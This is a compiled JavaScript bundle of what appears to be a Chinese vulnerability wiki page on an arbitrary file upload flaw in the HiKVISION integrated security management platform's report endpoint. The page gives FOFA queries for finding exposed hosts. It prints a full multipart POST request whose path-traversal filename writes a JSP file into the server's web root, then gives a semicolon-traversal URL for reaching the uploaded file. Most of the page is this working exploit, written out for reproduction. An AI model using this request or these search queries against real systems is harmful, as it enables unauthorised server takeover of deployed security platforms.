(window.webpackJsonp=window.webpackJsonp||[]).push([[74],{1376:function(s,a,t){s.exports=t.p+"assets/img/1681661275768-9965dbd4-176f-48bc-b55a-062dbe7c5317-20230809120725683.d71f35b4.png"},1377:function(s,a,t){s.exports=t.p+"assets/img/1681709277423-114b364b-2e5a-4fb0-a7b9-26154f61ca9e.2ff6d2e2.png"},1378:function(s,a,t){s.exports=t.p+"assets/img/1681709313430-8f4e019f-f3b7-41fc-a86b-ba1c07e59d45.ce381d6b.png"},1379:function(s,a,t){s.exports=t.p+"assets/img/1681709342417-a815332d-13c9-40e4-844a-42eb54661897.9bb50fbe.png"},1380:function(s,a,t){s.exports=t.p+"assets/img/1681709424146-cb0ef1b8-4732-4c3a-a041-37bad6125d44.dbfcebc5.png"},2913:function(s,a,t){"use strict";t.r(a);var e=t(64),r=Object(e.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"hikvision-综合安防管理平台-report-任意文件上传漏洞"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#hikvision-综合安防管理平台-report-任意文件上传漏洞"}},[s._v("#")]),s._v(" HiKVISION 综合安防管理平台 report 任意文件上传漏洞")]),s._v(" "),a("h2",{attrs:{id:"漏洞描述"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),a("p",[s._v("HiKVISION 综合安防管理平台 report接口存在任意文件上传漏洞，攻击者通过构造特殊的请求包可以上传任意文件，获取服务器权限")]),s._v(" "),a("h2",{attrs:{id:"漏洞影响"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),a("p",[s._v("HiKVISION 综合安防管理平台")]),s._v(" "),a("h2",{attrs:{id:"网络测绘"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[s._v("#")]),s._v(" 网络测绘")]),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v('app="HIKVISION-综合安防管理平台" ')]),a("br"),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v('web.title=="综合安防管理平台"  ')]),a("br"),s._v(" "),a("h2",{attrs:{id:"漏洞复现"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),a("p",[s._v("登陆页面")]),s._v(" "),a("p",[a("img",{attrs:{src:t(1376),alt:"img"}})]),s._v(" "),a("div",{staticClass:"language-plain line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plain"}},[a("code",[s._v("WEB-INF/classes/com/hikvision/svm/controller/ExternalController.class\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:t(1377),alt:"img"}})]),s._v(" "),a("div",{staticClass:"language-plain line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plain"}},[a("code",[s._v("WEB-INF/classes/com/hikvision/svm/business/serivce/impl/ExternalBusinessServiceImpl.class\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:t(1378),alt:"img"}}),s._v("构造请上传文件 (通过 env泄漏获取绝对路径，路径一般不会修改)")]),s._v(" "),a("div",{staticClass:"language-sql line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-sql"}},[a("code",[s._v("POST "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("svm"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("api"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("external"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("report HTTP"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1.1")]),s._v("\nHost: \nContent"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("Type")]),s._v(": multipart"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("form"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("data")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" boundary"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("----WebKitFormBoundary9PggsiM755PLa54a")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("------WebKitFormBoundary9PggsiM755PLa54a")]),s._v("\nContent"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Disposition: form"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("data")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" name"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"file"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" filename"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp"')]),s._v("\nContent"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("Type")]),s._v(": application"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("zip\n\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("out")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"test"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("------WebKitFormBoundary9PggsiM755PLa54a--")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br")])]),a("p",[a("img",{attrs:{src:t(1379),alt:"img"}})]),s._v(" "),a("div",{staticClass:"language-plain line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plain"}},[a("code",[s._v("/portal/ui/login/..;/..;/new.jsp\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:t(1380),alt:"img"}})])],1)}),[],!1,null,null,null);a.default=r.exports}}]);